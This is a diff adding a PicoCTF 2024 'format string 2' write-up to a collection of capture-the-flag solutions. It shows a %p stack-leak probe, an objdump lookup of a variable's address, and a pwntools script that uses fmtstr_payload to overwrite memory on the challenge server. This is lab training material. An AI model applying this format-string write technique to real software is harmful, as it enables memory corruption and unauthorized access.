@@ -757,6 +757,45 @@ io.interactive()
 
 6. Running this payload against the server given in the description gives terminal access. `ls` reveals a file called `flag.txt` and the flag is hidden inside is as text content.
 
+#### format string 2
+- [Link](https://play.picoctf.org/practice/challenge/448)
+- From: PicoCTF 2024
+- Difficulty: Medium
+- Completed: 2024/10/18
+
+Description:
+
+This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack! Download the binary [here](https://artifacts.picoctf.net/c_rhea/26/vuln). Download the source [here](https://artifacts.picoctf.net/c_rhea/26/vuln.c).
+
+Solution:
+
+Basically there is C code where we need to change value of a variable to something else by exploiting printf vulnurability.
+
+1. Connect to the server and give `AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p` as input to get the offset. It's 14 in this case.
+2. `objdump -D ./vuln | grep "sus"` reveals address of the sus variable
+3. The following payload changes `sus` value and reveals the flag:
+
+```python
+from pwn import *
+
+context.binary = ELF('./vuln')
+
+p = remote('rhea.picoctf.net', 50780)
+
+payload = fmtstr_payload(14, {0x404060: 0x67616c66})
+
+p.sendline(payload)
+
+flag = p.recvall()
+
+print("Flag: ", flag)
+```
+
+
+
+
+
+
 
 ---
 
